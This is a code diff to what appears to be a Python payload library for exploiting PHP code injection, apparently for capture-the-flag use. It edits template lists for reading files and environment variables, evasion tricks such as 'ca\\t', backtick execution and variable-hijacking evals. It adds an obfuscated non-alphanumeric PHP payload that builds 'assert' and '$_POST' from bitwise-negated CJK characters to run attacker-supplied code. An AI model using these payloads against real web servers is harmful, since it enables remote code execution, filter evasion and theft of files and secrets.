@@ -15,10 +15,7 @@ READFILE_TEMPLATES = [
     "rev {path}",
     "uniq {path}",
     "base64 {path}",
-    "mv {path} {path}.txt",
-    "cp {path} /tmp/flag.txt",
     "awk '1' {path}",
-    "diff / {path}",
     "dd if={path}",
     "ls {path}",
     "ca\\t {path}",
@@ -38,6 +35,10 @@ READ_ENV_TEMPLATES = [
     "env",
     "printenv",
     "set",
+]
+
+ROOT_DISCOVERY_TEMPLATES = [
+    "diff / /home",
 ]
 
 REFLECT_SHELL_TEMPLATES = [
@@ -91,6 +92,25 @@ VARIABLE_HIJACK_TEMPLATES = [
     "eval(array_pop(next(get_defined_vars())));",
 ]
 
+NON_ALNUM_ASSERT_POST_PAYLOAD = (
+    "$__=('>'>'<')+('>'>'<');"
+    "$_=$__/$__;"
+    "$____='';"
+    "$___=\u7730;$____.=~($___[$_]);"
+    "$___=\u548c;$____.=~($___[$__]);"
+    "$___=\u548c;$____.=~($___[$__]);"
+    "$___=\u7684;$____.=~($___[$_]);"
+    "$___=\u534a;$____.=~($___[$_]);"
+    "$___=\u59cb;$____.=~($___[$__]);"
+    "$_____='_';"
+    "$___=\u4fef;$_____.=~($___[$__]);"
+    "$___=\u7730;$_____.=~($___[$__]);"
+    "$___=\u6b21;$_____.=~($___[$_]);"
+    "$___=\u7ad9;$_____.=~($___[$_]);"
+    "$_=$$_____;"
+    "$____($_[$__]);"
+)
+
 # 触发 UA 头提示
 HEADER_TIP_TRIGGER_PAYLOADS = {
     "print_r(getallheaders());",
@@ -99,6 +119,10 @@ HEADER_TIP_TRIGGER_PAYLOADS = {
 
 VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS = {
     "eval(array_pop(next(get_defined_vars())));",
+}
+
+ASSERT_POST_TIP_TRIGGER_PAYLOADS = {
+    NON_ALNUM_ASSERT_POST_PAYLOAD,
 }
 
 HEADER_EXEC_TEMPLATES = [
@@ -176,7 +200,6 @@ SHORT_TAG_TEMPLATES = [
 
 # 反引号
 BACKTICK_TEMPLATES = [
-    "`{path}`",
     "`cat {path}`",
 ]
 
